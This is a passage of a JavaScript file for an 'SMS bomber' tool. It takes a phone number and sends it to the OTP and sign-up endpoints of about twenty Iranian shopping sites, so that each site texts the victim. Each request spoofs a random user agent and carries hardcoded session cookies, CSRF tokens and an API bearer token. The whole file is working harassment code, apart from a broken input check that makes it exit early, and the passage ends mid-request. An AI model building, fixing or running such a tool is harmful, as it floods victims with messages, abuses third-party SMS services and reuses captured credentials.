const { default: axios } = require("axios");
const userAgents = require("user-agents");
const { methods } = require("./methods.js");
const fs = require("fs");
const path = require("path");

const genUserAgent = () => {
  return new userAgents({ deviceCategory: "desktop" }).random().toString();
};

const CreateApp = {
  async Boombers() {
    async function Send() {
      // const number = "09162891189";
      // const withoutZero = number.slice(1, 11);

      const readline = require('readline');

      const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
      });

      rl.question("Enter a number: ", (userInput) => {
        console.log("User entered number:", userInput);
        const number = userInput
        const withoutZero = userInput.slice(1, 11)
        if (typeof number != 'number') {
          console.log('Input Faild\nEnter Number')
          rl.close();
        } else {

          const modiseh = async () => {
            const headers = {
              "User-Agent": genUserAgent(),
              'Accept': "*/*",
              "Accept-Language": "en-US,en;q=0.5",
              "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
              "X-Requested-With": "XMLHttpRequest",
              'Host': "www.modiseh.com",
              "Accept-Encoding": "gzip, deflate, br",
              "Content-Length": "256",
              'Origin': "https://www.modiseh.com",
              'Referer':
                "https://www.modiseh.com/customer/account/login/referer/aHR0cHM6Ly93d3cubW9kaXNlaC5jb20v/",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "cors",
              "Sec-Fetch-Site": "same-origin",
            };
            await axios
              .post(
                "https://www.modiseh.com/customer/account/loginpost/",
                `otp_code=&login%5Busername%5D=&username=${number}&pass=&my_pass=&is_force_login=&customer_set_password=&customer_set_password2=&form_key=G9C8ev2ubrk2B1iB&type=enter_mobile&captcha%5Buser_login%5D=123456&referer=aHR0cHM6Ly93d3cubW9kaXNlaC5jb20v&otp_token=`,
                { headers: headers }
              )
              .then((res) => {
                console.log(res.status);
              })
              .catch(() => {
                console.log("Error");
              });
          };

          const watchonline = async () => {
            const headers = {
              'Host': "api.watchonline.shop",
              "Accept-Encoding": "gzip,deflate,br",
              "Content-Length": "24",
              'Origin': "https://www.watchonline.shop",
              'Connection': "keep-alive",
              'Referer': "https://www.watchonline.shop",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "cors",
              "Sec-Fetch-Site": "same-site",
              'TE': "trailers",
              "User-Agent": genUserAgent(),
              'Accept': "application/json",
              "Accept-Language": "en-US,en;q=0.5",
              "Content-Type": "application/json",
              'Authorization':
                "Bearer 17cdfbce5e9f37acdb8f6bb712e0f688128077600d7a15b875ff627f6d565e70",
            };
            await axios
              .post(
                "https://api.watchonline.shop/api/v1/otp/request",
                { mobile: number },
                { headers: headers }
              )
              .then((res) => {
                console.log(res.status);
              })
              .catch(() => {
                console.log("Error");
              });
          };

          const padmira = async () => {
            const headers = {
              Host: "padmira.ir",
              "Accept-Encoding": "gzip,deflate,br",
              "Content-Length": "18",
              'Origin': "https://padmira.ir",
              'Connection': "keep-alive",
              'Referer': "https://padmira.ir/user/login",
              'Cookie': "XSRF-TOKEN=eyJpdiI6IjdFWU5HT0pyZmZcL2xJTTVPRDMrVzBBPT0iLCJ2YWx1ZSI6IjVtbzd6b2VuQm54ZGpib3NUYnVlZkJEYmhyNDNcL1dHaWFMR1wvc0RjQTR5YnlJSm9uZVR3MWZzeFpLMmkwajJnNCIsIm1hYyI6IjFjZTc0YmM4YjJmYTlmZWJkYmRiYTIyMjZjN2Q3ZWRlNWU3ZGY5ODkyNGVjYjcyZGI4ZWUyZDlhZWIxMjAxZmIifQ%3D%3D; laravel_session=eyJpdiI6InlLd05teU9vNXlLZ1MwdDBHUGMzeEE9PSIsInZhbHVlIjoiMmp5K3hYSUdPSWdGcTJ4SjVwM3BIa2lmN25ySStDUTVjTktGWjdvSlwvaFlFTVBxa1ZPdWNIczhka2dTajdXTEhPNngxNjFadmRwcVlVM0x1OEZDRENMeWdaNFo5Yk1veCt1YitUYzNCOVQrZHRkRUxvSk9BR0FPVEpYakwrOUllIiwibWFjIjoiYWE0MGQwNWU3ZWU2YThjMzg2NzkwYzk0MDczYWY1ODc2YWZiOWVhODVlOWZmYTZjOThlNGExZTYyYTg1NGRhZiJ9; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=47caa90e-6a5a-9f4a-9a12-fae92e45dd7c; _yngt=9fcd7757-74985-57325-586e8-821bb1753181e; _ga_EZJX2CRC99=GS1.1.1709963999.3.0.1709963999.60.0.0; _ga=GA1.2.1636794051.1709741187; yektanet_session_last_activity=3/9/2024; _yngt_iframe=1; _gid=GA1.2.2081524752.1709960405; analytics_session_token=11cef777-39df-1ea9-8506-12e0b20a7707; _gat_gtag_UA_171656622_1=1",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "cors",
              "Sec-Fetch-Site": "same-site",
              'TE': "trailers",
              "User-Agent": genUserAgent(),
              'Accept': "*/*",
              "Accept-Language": "en-US,en;q=0.5",
              "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
              "X-CSRF-TOKEN": "sgi3XhwvcYszWaao946OqCOi9ZbhpyeKmMY7ZZcT",
              "X-Requested-With": "XMLHttpRequest",
              "Alt-Used": "padmira.ir",
            };

            await axios
              .post("https://padmira.ir/ajax/send_sms_active", `mobile=${number}`, {
                headers: headers,
              })
              .then((res) => {
                console.log(res.status);
              })
              .catch(() => {
                console.log("Error");
              });
          };

          const tagmond = async () => {
            const headers = {
              "User-Agent": genUserAgent(),
              'Accept': "*/*;q=0.5, text/javascript, application/javascript, application/ecmascript, application/x-ecmascript",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate, br",
              'Referer': "https://tagmond.com/",
              "Content-Length": "69",
              'Origin': "https://tagmond.com",
              'Connection': "keep-alive",
              'Cookie': "_TAGZone_session=ei9LUVF6dmRXcmpuWnZvN2xNV3Q3Ujk0Sk80OVR5Z1l4Um93VzRCWCthRXEzWC9WZ0VYdG00WVRVeTB2dTBSOG5XOEU2c25YcjlBOGZpempmRUtndjBUSWNkYzhLdDhNVmhGdjJlQlBoTjg4N1VUOEZzcnZoTEZzSDVnT2F6Z0tOMUJYWjBMZUFyOFlGaGJFUkthT2M5empUVzFNTS8rNnBTMHF3QklIcFVRTmIzT1ZCS1dSaGdBKzNQZTFmRjlsMEJpcEVnd3RWamVsVjBRU1RnQ0JkQT09LS1GWFQ1M0JGZlFPb3ZqNjJ4a1lVQkNBPT0%3D--5c15634acf67341bdbdd2a87a60b3ad0bff0c747; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=90d2bbdc-bb15-8d6a-f02d-ed79fa2a9114; sib_cuid=d2207012-778c-4db3-8a2a-8da0fe3566bc; _yngt=c04bb913-35a90-049fd-dfa38-8a55771d568b6; _ga_WWNJT1BX8R=GS1.1.1709964425.2.0.1709964425.60.0.0; _ga=GA1.2.931568105.1709741112; _clck=1b65ri0%7C2%7Cfjx%7C0%7C1526; analytics_session_token=67ff5b6e-d5a0-d241-7eb2-a7c4cc296242; yektanet_session_last_activity=3/9/2024; _yngt_iframe=1; _gid=GA1.2.1625698951.1709964426; _gat_gtag_UA_58566765_6=1; _dc_gtm_UA-58566765-6=1; _clsk=buqysu%7C1709964428474%7C1%7C1%7Cv.clarity.ms%2Fcollect",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "no-cors",
              "Sec-Fetch-Site": "same-origin",
              "X-CSRF-Token": "YCQjpZMtnXh8xRFFm7UcolOscZfsvksc3KVS/lUjmixalKkp5d8gCHFBU/vzOIuzldbWbFU2Q1rrrG5tZ3QKIg==",
              "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
              "X-Requested-With": "XMLHttpRequest",
              'Pragma': "no-cache",
              "Cache-Control": "no-cache",
            };

            await axios
              .post(
                "https://tagmond.com/phone_number",
                `utf8=%E2%9C%93&custom_comment_body_hp_24124=&phone_number=${number}`,
                { headers: headers }
              )
              .then((res) => {
                console.log(res.status);
              })
              .catch(() => {
                console.log("Error");
              });
          };

          const shixon = async () => {
            const headers = {
              'Host': "www.shixon.com",
              "User-Agent": genUserAgent(),
              'Accept': "text/html, */*; q=0.01",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate, br",
              'Referer': "https://www.shixon.com/",
              "Content-Length": "183",
              'Origin': "https://www.shixon.com",
              'Connection': "keep-alive",
              'Cookie': "_ga_QWBHS11S14=GS1.1.1709965127.2.0.1709965127.60.0.0; _ga=GA1.1.523176026.1709740945; _ga_H5FHF0Y4MP=GS1.1.1709965144.2.0.1709965144.0.0.0; rusfidm=; __RequestVerificationToken=ZNP4TPoVsB6260cIi3fTNohv3Cr2T4_4qHmF5hLPVjX5pqljLcsoPR-W_BoLsPz1Kb2im6IZPmZ6T0xJjN7lGQ-_-iUkJ91CPRolP6ryYLk1; shxppu=1; ASP.NET_SessionId=14vsfjn1fsr4nadbasblbxlg; _gid=GA1.2.1582076762.1709965128; _gat_gtag_UA_112477936_1=1",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "no-cors",
              "Sec-Fetch-Site": "same-origin",
              "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
              "X-Requested-With": "XMLHttpRequest",
              'Pragma': "no-cache",
              "Cache-Control": "no-cache",
            };

            await axios
              .post(
                "https://www.shixon.com/Home/RegisterUser",
                `M=${number}&P=U.BrFq%5DB2s%3AQ%3AH!&s=888&PU=&__RequestVerificationToken=4SJAeS0GYE1F6UYZx-6qzoaZE6LWPfgSob1COK5xhZ-MhNvjZO3JEtkVgQISV9y0AQ5nTjjIYfwodKmjcjGWG9baYhBFaEYn01uRy7JGt3M1`,
                { headers: headers }
              )
              .then((res) => {
                console.log(res.status);
              })
              .catch(() => {
                console.log("Error");
              });
          };

          const digistyle = async () => {
            const headers = {
              'Host': "www.digistyle.com",
              "User-Agent": genUserAgent(),
              'Accept': "text/html, application/xhtml + xml, application/xml; q = 0.9, image/avif, image/webp,*/*;q=0.8",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate, br",
              'Referer': "https://www.digistyle.com/users/login-register/",
              "Content-Type": "application/x-www-form-urlencoded",
              "Content-Length": "42",
              'Origin': "https://www.digistyle.com",
              'Connection': "keep-alive",
              'Cookie': '_uid_=3b7103cbbf1eeaeeecc9077d6449c7e9; tracker_glob_new=fmpvInT; _ga_84EMKEXT1M=GS1.1.1709965501.2.0.1709965501.60.0.0; _ga=GA1.1.1483542259.1709740824; _xpid=3841713073; _xpkey=6lig0d9qy85Y8G0hisUctO3aBXzOvKJY; _ga_B3LE15KSE1=GS1.1.1709965502.2.0.1709965502.60.0.0; PHPSESSID=u69fi3uoi9pcdvcr9peccqp61ki3fjkuepl3c801psnnisp35ehh6nu6vpru4o7r; tracker_session=6Of4ffJ; TS01286926=0102310591f9d5f53090d996b0345bcc24dc14a52adae55e4c023e1231222894ba8c29609aaef6fcd04e22b66e4cc90b147a2bb4c8a503785a5217d095907aed0bec2ad121b5cada25aa498b340d5c8445e5eacaaff0be8b386468558124e474f3a7dc54be; sn_tracker_campaign={"u_medium":"Referral","u_source":"https://www.digistyle.com/","u_campaign":"Referral","u_term":"Referral","u_content":"Referral"}; _gid=GA1.2.927125991.1709965501; _gat_UA-83129158-1=1; _hjSessionUser_2775789=eyJpZCI6ImJmZTVjYmRjLTM0M2EtNWUyNS1hNmY1LWFmNTgzMGZiMjZjMCIsImNyZWF0ZWQiOjE3MDk5NjU1MDMyMTcsImV4aXN0aW5nIjpmYWxzZX0=; _hjSession_2775789=eyJpZCI6ImEzZDRiMTY2LTU0NTQtNGQ1Zi05OWY4LTkwOTYzNjJlMDhiZCIsImMiOjE3MDk5NjU1MDMyMTcsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',
              "Upgrade-Insecure-Requests": "1",
              "Sec-Fetch-Dest": "document",
              "Sec-Fetch-Mode": "navigate",
              "Sec-Fetch-Site": "same-origin",
              "Sec-Fetch-User": "?1",
              'TE': "trailers",
            };

            await axios
              .post(
                "https://www.digistyle.com/users/login-register/",
                `loginRegister%5Bemail_phone%5D=${number}`,
                { headers: headers }
              )
              .then((res) => {
                console.log(res.status);
              })
              .catch(() => {
                console.log("Error");
              });
          };

          const gheysi = async () => {
            const url = "https://gheysi.com/login?back=my-account";
            const body = `username=${number}&id_customer=&back=&firstname=%D8%B9%D9%84%DB%8C&lastname=%DB%8C%D8%A8%DB%8C%D8%A8%D8%B3&password=)%2B7FGBUxwS_%40)4%3D&action=register&back=my-account&ajax=1`;
            const headers = {
              'Host': "gheysi.com",
              "User-Agent": genUserAgent(),
              'Accept': "*/*",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate, br",
              'Referer': "https://gheysi.com/login?back=my-account",
              "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
              "X-Requested-With": "XMLHttpRequest",
              "Content-Length": "178",
              'Origin': "https://gheysi.com",
              "Alt-Used": "gheysi.com",
              'Connection': "keep-alive",
              'Cookie': "PHPSESSID=c3276953f52502aecad8ba7b5eece043; PrestaShop-90345c12122759df2d4513852522236c=def50200ce7233598a580f8a9892840d8bce899a82cfb48d716b0829ed5e5de014fdc429bcdef9408e9466ced2a28118ecc5f023eed67cf82a802f39737f80da11298c6ae96d25256f1d177c83c877d3cc3ae83133c7590ec59f2d6b8dd0a523deee311e6871c94509306a132e67c322608956f9a3a2bf03a7920b312e1a413d4fbc074d3ccf90f40338eb1777b771ac2f116e74b760f578232e9a26855baf03264234eca85a29e2328ad2697a0999d4c2426fa88dd7c300587782abd1d04e80a499154fdb33d9b344e9fcac34c0926fe53bc12ee1441890fb20f559767af1347892b06e1be2272f01bdfa7a3c8c62b3b40b36a7a3793458fd6bd01bd8; _ga_82SFH692P0=GS1.1.1709974688.2.1.1709974748.0.0.0; _ga=GA1.1.2017604613.1709740254; PrestaShop-a23d4c8ad70d2b12ddc2597003c58ac3=def50200f20ef83a29e1e7b9ac66924a5398ac674f07f66b4387217d7a3f2258e934e62dcd595b2bbb78d9260393c0a4341478b656a90aa11ea563d5080a33ba56f6059f815298a35791cf1a06e08cb95fb2a0c57cba0ef5a57b7863096f20c34f4e84a4c58b21bd4a7fba119ef0d65ecaf83e118b4b4ed377c69d5c6a2dd300c520bc8460e2a2433f66f373d3a6462e5d84a7ade2cf677d8d70393dcd6f4146d0a50467628cb776f630da9d0de58a6174ae607f4a5b88d02d45893197c04fef6d48eaa87d7521f7fc16293e358ec9708c6744bf27017f9c1e; PrestaShop-a4ba6d1228efb5c3f95ec47fb6d59564=def50200a6b4e10cdb3824e104dd5f3904af8aec5b101bf62cfc5a00fce065681382c1df84c814053cebf936cb0e25e9dba238ae78e5c62d14157d32fc9ec1e7f8ffa479a5329cc87adff7d6808e4282c4d4bd794b1fd4fb960d268b8982a237d30462292f3a7a666ac5af6177f9cb11275767b12c59c1d63f3ed7b046339f0a95edad102b6cc459abd5c90b4c63c02a0d934f39d04e0846008e473f77c72d9d9cb67d6584ef3530aaaa8558306c46b1f36ee3ff10cb824aa01ea2a031ac308edb0e1acc8d75c2bb718d8cd326067b9268cc488706f8058763",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "no-cors",
              "Sec-Fetch-Site": "same-origin",
              'TE': "trailers",
              'Pragma': "no-cache",
              "Cache-Control": "no-cache",
            };

            await axios
              .post(url, body, { headers: headers })
              .then((res) => {
                console.log(res.statusText);
              })
              .catch(() => {
                console.log("Error");
              });
          };

          const chitoorsh = async () => {
            const url = "https://chitoorsh.com/wp-admin/admin-ajax.php";
            const body = `action=digits_check_mob&countrycode=%2B98&mobileNo=${number}&csrf=6d4b7665bd&login=2&username=adddad&email=&captcha=&captcha_ses=&json=1&whatsapp=0`;
            const headers = {
              'Host': "chitoorsh.com",
              "User-Agent": genUserAgent(),
              'Accept': "*/*",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate, br",
              "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
              "X-Requested-With": "XMLHttpRequest",
              "Content-Length": "149",
              'Origin': "https://chitoorsh.com",
              'Connection': "keep-alive",
              'Referer': "https://chitoorsh.com/my-account/?action=register",
              'Cookie': "digits_countrycode=98; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-03-09%2008%3A49%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fchitoorsh.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-03-09%2008%3A49%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fchitoorsh.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%3B%20rv%3A123.0%29%20Gecko%2F20100101%20Firefox%2F123.0; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fchitoorsh.com%2Fmy-account%2F%3Faction%3Dregister",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "cors",
              "Sec-Fetch-Site": "same-origin",
              'TE': "trailers",
            };

            await axios
              .post(url, body, { headers: headers })
              .then((res) => {
                console.log(res.status);
              })
              .catch(() => {
                console.log("Error");
              });
          };

          const kukala = async () => {
            const url = "https://api.kukala.ir/api/user/Otp";
            const body = { phoneNumber: number };
            const headers = {
              'Host': "api.kukala.ir",
              "User-Agent": genUserAgent(),
              'Accept': "application / json, text / plain, */*",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate, br",
              "Content-Type": "application/json",
              "Content-Length": "29",
              'Referer': "https://www.kukala.ir/",
              'Origin': "https://www.kukala.ir",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "no-cors",
              "Sec-Fetch-Site": "same-site",
              'traceNumber': "kukala-1709976366177",
              'DeviceId': "browser / Firefox",
              "Access-Control-Allow-Origin": "*",
              "Cache-Control": "public, no-cache",
              "api-version": "1.0",
              'Connection': "keep-alive",
              'TE': "trailers",
              'Pragma': "no-cache",
            };

            await axios
              .post(url, body, { headers: headers })
              .then((res) => {
                console.log(res.status);
              })
              .catch(() => {
                console.log("Error");
              });
          };

          const banimode = async () => {
            const url = "https://mobapi.banimode.com/api/v2/auth/request";
            const body = { phone: number, type: "sms" };
            const header = {
              'Host': "mobapi.banimode.com",
              "User-Agent": genUserAgent(),
              'Accept': "application/json, text/plain, */*",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate, br",
              'Referer': "https://www.banimode.com/",
              "Content-Length": "36",
              'Origin': "https://www.banimode.com",
              'Connection': "keep-alive",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "no-cors",
              "Sec-Fetch-Site": "same-site",
              "Content-Type": "application/json;charset=utf-8",
              'platform': "desktop",
              'Pragma': "no-cache",
              "Cache-Control": "no-cache",
            };

            await axios
              .post(url, body, { headers: header })
              .then((res) => {
                console.log(res.status);
              })
              .catch(() => {
                console.log("Error");
              });
          };

          const pindo = async () => {
            const url = "https://api.pindo.ir/v1/user/login-register/";
            const body = { phone: number };
            const header = {
              'Host': "api.pindo.ir",
              "User-Agent": genUserAgent(),
              'Accept': "application/json, text/plain, */*",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate, br",
              "Content-Type": "application/json",
              "X-Requested-With": "XMLHttpRequest",
              'Client': "desktop",
              'ClientId': "a947b468-3823-4e58-abe9-7f9b355947ad",
              "supernova-optimize-response": "1",
              "Content-Length": "23",
              'Origin': "https://www.pindo.ir",
              'Connection': "keep-alive",
              'Referer': "https://www.pindo.ir/",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "cors",
              "Sec-Fetch-Site": "same-site",
              'TE': "trailers",
            };

            await axios
              .post(url, body, { headers: header })
              .then((res) => {
                console.log(res.status);
              })
              .catch(() => {
                console.log("Error");
              });
          };

          const zigap = async () => {
            const url =
              "https://zigap.smilinno-dev.com/api/v1.8/authenticate/sendotp";
            const body = { phoneNumber: `+98${withoutZero}` };
            const header = {
              'Host': "zigap.smilinno-dev.com",
              "User-Agent": genUserAgent(),
              'Accept': "application/json, text/plain, */*",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate, br",
              "Content-Type": "application/json",
              "Content-Length": "31",
              'Referer': "https://app.zigap.ir/",
              "Access-Control-Allow-Credentials": "true",
              "Access-Control-Allow-Origin": "*",
              "Access-Control-Allow-Methods":
                "GET,OPTIONS,DELETE,PATCH,POST,PUT,WS,WSS",
              "Access-Control-Allow-Headers":
                "Origin, X-Requested-With, Content-Type, Accept, Authorization, X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version",
              'publisher': "Web",
              'Origin': "https://app.zigap.ir",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "cors",
              "Sec-Fetch-Site": "cross-site",
              'Connection': "keep-alive",
            };

            await axios
              .post(url, body, { headers: header })
              .then((res) => {
                console.log(res.status);
              })
              .catch(() => {
                console.log("Error");
              });
          };

          const victorshop = async () => {
            const url = "https://www.vitrin.shop/api/v1/user/request_code";
            const body = { phone_number: number, forgot_password: false };
            const header = {
              'Host': "www.vitrin.shop",
              "User-Agent": genUserAgent(),
              'Accept': "application/json",
              "Accept-Language": "en - US, en; q = 0.5",
              "Accept-Encoding": "gzip, deflate, br",
              'Referer': "https://www.vitrin.shop/login",
              "Content-Length": "54",
              'Origin': "https://www.vitrin.shop",
              'Connection': "keep-alive",
              'Cookie': "analytics_token = b7bf1e69 - 1236 - 768a - aaa2 - 4216172de853; XSRF - TOKEN=eyJpdiI6IkhDZzEzM3BOWEFPTDFRdDIyRXFWK3c9PSIsInZhbHVlIjoiUktrbnlyc3lOTzBHa3JtZi9sUitERmVwM0kvVGN5bjdBVENVaDNNcVgxdGYzTzJLQ3p6ZzMrMHdMeWZFZjJyazBJTkw1MTVwVTVrbTQvTU9zcGorSUR2MmNhSVFXdUZHbXhBUW1jV2xad1ZMY0dTalFiL3Y1eWxVdzlGSlhDWUQiLCJtYWMiOiI0ODJlMDUwZjVmYWZiMGY2MDMyMzJiZmYxOWNkZDgyYjU4OGZhNjhhNmNmNmYzZjA1ODhmYmM5MmU4YjEwYWFhIiwidGFnIjoiIn0 % 3D; vitrinshop2_session = eyJpdiI6IjIyZDYzT2RWdjNKcFdWRGFrR2tuQnc9PSIsInZhbHVlIjoicWtuMkhvUk5QNXd2Yld6OE9jTkdCUUE2bDJZNUlyZGJXUGhOSHREOXZvSHBGbDBSemllWkRpSENmc1JvaWlYVXpXUytmd3dYQ09KY1FEK3lWRHBsRzFmYk1JSGxJZnJkWitJWDdQb040VjVjdkJxMUNjQTA0ZDBBYlE3WnJOalkiLCJtYWMiOiI2MGY4YjI2ZWNkMWMzOWU1MjVlYTVkNmVkZTY0NjUwM2ZhZmI4NWEyODM1NTNjZGJhNGU5YzNjOWNkYjI4OWQ3IiwidGFnIjoiIn0 % 3D; _yngt = 5e7f1356 - f388 - 48d1 - 87a0 - 13e5abdb4d6e; _ga_BV7WW1B7H3 = GS1.1.1709980740.2.0.1709980740.0.0.0; _ga = GA1.2.1078590918.1709739215; _gcl_au = 1.1.1663900174.1709739220; analytics_session_token = c00e5356 - 234f - 2841 - 7bf6 - 6f6c397ad5f3; yektanet_session_last_activity = 3 / 9 / 2024; _yngt_iframe = 1; _gid = GA1.2.1256301781.1709980742; _gat_gtag_UA_141728751_1 = 1",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "no-cors",
              "Sec-Fetch-Site": "same - origin",
              'TE': "trailers",
              "Content-Type": "application/json",
              "X-XSRF-TOKEN": "eyJpdiI6IkhDZzEzM3BOWEFPTDFRdDIyRXFWK3c9PSIsInZhbHVlIjoiUktrbnlyc3lOTzBHa3JtZi9sUitERmVwM0kvVGN5bjdBVENVaDNNcVgxdGYzTzJLQ3p6ZzMrMHdMeWZFZjJyazBJTkw1MTVwVTVrbTQvTU9zcGorSUR2MmNhSVFXdUZHbXhBUW1jV2xad1ZMY0dTalFiL3Y1eWxVdzlGSlhDWUQiLCJtYWMiOiI0ODJlMDUwZjVmYWZiMGY2MDMyMzJiZmYxOWNkZDgyYjU4OGZhNjhhNmNmNmYzZjA1ODhmYmM5MmU4YjEwYWFhIiwidGFnIjoiIn0=",
              'Pragma': "no-cache",
              "Cache-Control": "no-cache",
            };

            await axios
              .post(url, body, { headers: header })
              .then((res) => {
                console.log(res.statusText);
              })
              .catch(() => {
                console.log("Error");
              });
          };

          const giftcardstore = async () => {
            const url = "https://www.giftcardstore.ir/Account/SmsLoginSendCode";
            const body = { PhoneNumber: number, Server: 1 };
            const header = {
              'Host': "www.giftcardstore.ir",
              "User-Agent": genUserAgent(),
              'Accept': "*/*",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate, br",
              'Referer': "https://www.giftcardstore.ir/account/login",
              "Content-Length": "40",
              'Origin': "https://www.giftcardstore.ir",
              'Connection': "keep-alive",
              'Cookie': "GiftcardStoreSessionCookie=CfDJ8C1JzPA%2FrDBPjJmTqUfS50bKT6QEqa%2Fms6k5lBHCecuYldINGSs8Jxf9%2BDINeqJ3LgHfZRFpSqz3vVGfjoaiIDvSPsP%2BWvoKSy7jeqQXFq%2FloL%2BL5Ey%2B9IVEZ7cB23%2B2fBpe%2BpDJlGm6kAe68I19grJXyXsz%2BTiqqtoMyntB0Xsm; _ga=GA1.2.1756424470.1709649835; _ga_9PEZMTQW74=GS1.2.1709981847.2.1.1709981848.59.0.0; _gid=GA1.2.558086919.1709981847; _gat_UA-110950141-1=1",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "no-cors",
              "Sec-Fetch-Site": "same-origin",
              'TE': "trailers",
              "Content-Type": "application/json; charset=utf-8",
              "X-Requested-With": "XMLHttpRequest",
              "Alt-Used": "www.giftcardstore.ir",
              'Pragma': "no-cache",
              "Cache-Control": "no-cache",
            };

            await axios
              .post(url, body, { headers: header })
              .then((res) => {
                console.log(res.status);
              })
              .catch(() => {
                console.log("Error");
              });
          };

          const gifkart = async () => {
            const url = "https://gifkart.com/request/";
            const body = `PhoneNumber=${number}`;
            const header = {
              'Host': "gifkart.com",
              "User-Agent": genUserAgent(),
              'Accept': "*/*",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate, br",
              'Referer': "https://gifkart.com/",
              "Content-Length": "23",
              'Origin': "https://gifkart.com",
              'Connection': "keep-alive",
              'Cookie': "analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=2fdfb6e1-5b2a-181d-71c5-3257022e49c5; _yngt=81c12290-0e87c-ca7af-fc1bf-f8b1e54cea18c; PHPSESSID=67c2d045c29c295ac9a6d5fd7f3b61cd; analytics_session_token=16a94349-feb3-2cb9-1a60-b32bd53e8b01; yektanet_session_last_activity=3/9/2024; _yngt_iframe=1",
              "Sec-Fetch-Dest": "empty",
              "Sec-Fetch-Mode": "no-cors",
              "Sec-Fetch-Site": "same-origin",
              'TE': "trailers",
              "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
              "X-Requested-With": "XMLHttpRequest",
              "Alt-Used": "gifkart.com",
              'Pragma': "no-cache",
              "Cache-Control": "no-cache",
            };

            await axios
              .post(url, body, { headers: header })
              .then((res) => {
                console.log(res.status);
              })
              .catch(() => {
                console.log("Error");
              });
          };

          const saatchico = async () => {
            const url = "https://saatchico.com/token";
            const body = `identifier=${number}`;
            const header = {
              'Host': "saatchico.com",
              "User-Agent": genUserAgent(),
              'Accept': "*/*",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate, br",
              "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
              "X-CSRF-TOKEN": "0dxHOKwhSkVoXfL9nTbC9VmoPwt71mFUMKDGgh62",
              "X-Requested-With": "XMLHttpRequest",
              "Content-Length": "22",
              'Origin': "https://saatchico.com",
              'Connection': "keep-alive",
              'Referer': "https://saatchico.com/",
